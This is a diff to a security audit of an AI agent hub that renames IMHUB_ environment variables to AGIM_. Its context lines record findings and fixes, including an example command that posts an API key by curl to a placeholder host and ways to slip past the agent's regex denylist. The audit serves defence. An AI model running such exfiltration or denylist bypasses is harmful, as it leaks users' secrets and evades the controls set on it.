@@ -22,14 +22,14 @@ A `native_exec` command could read every secret the agent holds (`*_API_KEY`, `D
 `SSH_*`) and exfil via `curl -d "$OPENAI_API_KEY" https://allowed.example`, defeating all SSRF
 guards. (Was CR-14, still unfixed at v1.3.6.)
 **Fix:** env allow-list (`buildExecEnv`): a small safe base set + per-spawn RPC injection +
-operator opt-in via `IMHUB_EXEC_ENV_PASS`. Everything else dropped.
+operator opt-in via `AGIM_EXEC_ENV_PASS`. Everything else dropped.
 
 **F2 · bwrap sandbox was opt-in (default OFF)** ✅ FIXED
 `src/core/llm/exec-dispatcher.ts` — `sandboxConfigured = sandboxMode === 'bwrap' && existsSync(...)`.
 Default was `/bin/sh -c <cmd>` with no namespace isolation. The dangerous-pattern denylist is a
 regex tripwire (trivially bypassed: `\rm`, `bash -c '…'`, `eval`, `/bin/rm`), so bwrap is the only
 real boundary — yet it had to be turned on manually. (Was CR-6, still unfixed.)
-**Fix:** default-on when `/usr/bin/bwrap` exists; only `IMHUB_EXEC_SANDBOX=off` disables it, and
+**Fix:** default-on when `/usr/bin/bwrap` exists; only `AGIM_EXEC_SANDBOX=off` disables it, and
 that path now logs a loud one-shot WARN.
 
 **F3 · DNS-rebinding SSRF was open** ✅ FIXED
@@ -72,7 +72,7 @@ passed (or you `complete_goal` first); `force` is exposed in the MCP tool schema
 
 ### 🟡 P2 — medium
 
-- **F8** `approval-bus.ts` `pendingById`/`pendingByThread` had no upper bound → OOM under approval spam. ✅ FIXED — `MAX_PENDING_APPROVALS` cap (default 5000, `IMHUB_APPROVAL_MAX_PENDING`); the oldest unresolved request is denied + evicted when the cap is hit.
+- **F8** `approval-bus.ts` `pendingById`/`pendingByThread` had no upper bound → OOM under approval spam. ✅ FIXED — `MAX_PENDING_APPROVALS` cap (default 5000, `AGIM_APPROVAL_MAX_PENDING`); the oldest unresolved request is denied + evicted when the cap is hit.
 - **F9** `goal-rpc.ts` `complete_goal` was not idempotent. ✅ FIXED — a retried call within a 60s window replays an `already_completed` ok result (bounded, self-pruning cache) instead of a confusing "no active goal" error. (CR-30.)
 - **F10** `exec-dispatcher` `clampTimeout` lacked a lower bound; `timeout_ms=1` self-DoS. ✅ FIXED — floored at 100ms. (CR-15.)
 - **F11** `fs-dispatcher` `hasRipgrep()` checked two hardcoded paths only. ✅ FIXED — now also searches every `$PATH` dir. (CR-24.)
@@ -90,7 +90,7 @@ passed (or you `complete_goal` first); `force` is exposed in the MCP tool schema
 - ✅ Login `?next=` has a `safeNext()` same-origin guard (`login.tsx:40`) — no open redirect.
 - ✅ IP-literal SSRF parsing was rewritten (integer/octal/hex/IPv6-compressed; CR-3/CR-4 fixed).
 - ✅ Loopback trust auto-disables when proxy-forward headers are present (`server.ts:isLoopbackPeer`).
-- ✅ Three-layer `IMHUB_PLATFORM_BLACKLIST`, symlink realpath guard (CR-1 fixed), UTF-8 truncation fix (CR-11 fixed).
+- ✅ Three-layer `AGIM_PLATFORM_BLACKLIST`, symlink realpath guard (CR-1 fixed), UTF-8 truncation fix (CR-11 fixed).
 
 ---
 
@@ -125,7 +125,7 @@ passed (or you `complete_goal` first); `force` is exposed in the MCP tool schema
 
 | File | Finding | Change |
 |---|---|---|
-| `src/core/llm/exec-dispatcher.ts` | F1 | `buildExecEnv()` env allow-list + `IMHUB_EXEC_ENV_PASS` |
+| `src/core/llm/exec-dispatcher.ts` | F1 | `buildExecEnv()` env allow-list + `AGIM_EXEC_ENV_PASS` |
 | `src/core/llm/exec-dispatcher.ts` | F2 | bwrap default-on; `=off` warns once |
 | `src/core/llm/exec-dispatcher.ts` | F10 | `clampTimeout` floored at 100ms |
 | `src/core/llm/web-dispatcher.ts` | F3 | `checkUrlSafetyAsync()` DNS-resolving SSRF check, wired into fetch + redirects |
@@ -133,7 +133,7 @@ passed (or you `complete_goal` first); `force` is exposed in the MCP tool schema
 | `src/core/llm/policy-approval-gate.ts` | F13 | `askUser` failure logged (was silent deny) |
 | `src/core/access-token.ts` | F5 | throttled `last_used_at` write (≥30s) |
 | `src/cli.ts` | F6 | sender gate fails **closed** when configured; load failure logged at `error` |
-| `src/core/goal-rpc.ts`, `imhub-dispatcher.ts` | F7 | `long_task` requires `force:true` to override an active goal |
+| `src/core/goal-rpc.ts`, `agim-dispatcher.ts` | F7 | `long_task` requires `force:true` to override an active goal |
 | `src/core/llm/fs-dispatcher.ts` | F11 | `hasRipgrep()` searches `$PATH` |
 | `src/plugins/messengers/discord/discord-adapter.ts` | F12 | DMs dropped when `allowedGuilds` set (unless a channel permits) |
 | `src/core/approval-bus.ts` | F8 | `MAX_PENDING_APPROVALS` cap with oldest-eviction |
